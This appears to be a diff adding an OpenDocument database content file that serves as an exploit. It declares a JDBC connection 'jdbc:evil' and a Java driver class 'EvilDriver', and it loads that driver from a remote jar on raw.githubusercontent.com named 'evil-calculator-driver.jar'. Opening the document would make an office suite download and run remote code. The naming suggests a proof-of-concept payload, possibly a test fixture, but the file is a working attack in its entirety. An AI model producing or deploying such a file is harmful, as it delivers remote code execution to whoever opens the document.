@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" office:version="1.2">
+  <office:body>
+    <office:database>
+      <db:data-source>
+        <db:connection-data>
+          <db:connection-resource xlink:href="jdbc:evil"/>
+          <db:login db:is-password-required="false"/>
+        </db:connection-data>
+        <db:driver-settings db:java-driver-class="EvilDriver" db:java-classpath="jar:https://raw.githubusercontent.com/S1N6H/etl-artifacts-20261007/master/evil-calculator-driver.jar!/"/>
+        <db:application-connection-settings/>
+      </db:data-source>
+    </office:database>
+  </office:body>
+</office:document-content>
